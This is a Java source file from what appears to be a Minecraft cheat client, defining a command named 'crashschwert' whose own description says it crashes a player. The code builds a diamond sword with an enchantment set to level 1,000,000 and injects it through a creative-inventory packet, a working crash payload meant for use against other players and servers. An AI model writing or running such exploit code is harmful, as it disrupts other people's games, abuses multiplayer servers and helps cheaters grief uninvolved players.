package me.bratwurst.module.Commands;

import com.mojang.authlib.yggdrasil.response.MinecraftTexturesPayload;
import me.bratwurst.manager.Command;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.item.ItemSword;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.potion.PotionEffect;
import net.minecraft.util.EnumChatFormatting;

public class SchwertCommand extends Command {
    public SchwertCommand() {
        super("cs", "crashschwert", "CrashSchwert Crasht einen spieler");
    }
    @Override
    public void onCommand(String command, String[] args) {
        ItemStack itm = new ItemStack(Items.diamond_sword);

        itm.setStackDisplayName(EnumChatFormatting.RED + "OPSchwert");
        NBTTagCompound base = new NBTTagCompound();
        NBTTagList ench = new NBTTagList();
        NBTTagCompound itmm = new NBTTagCompound();
        NBTTagCompound entityTag = new NBTTagCompound();


        entityTag.setInteger("Unbreakable", 1);

        itmm.setInteger("id", 16);
        itmm.setInteger("lvl", 1000000);

        ench.appendTag(itmm);

        entityTag.setTag("ench", ench);
        base.setTag("EntityTag", (NBTBase)entityTag);;

        itm.setTagCompound(base);
        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(8, itm));
    }
}
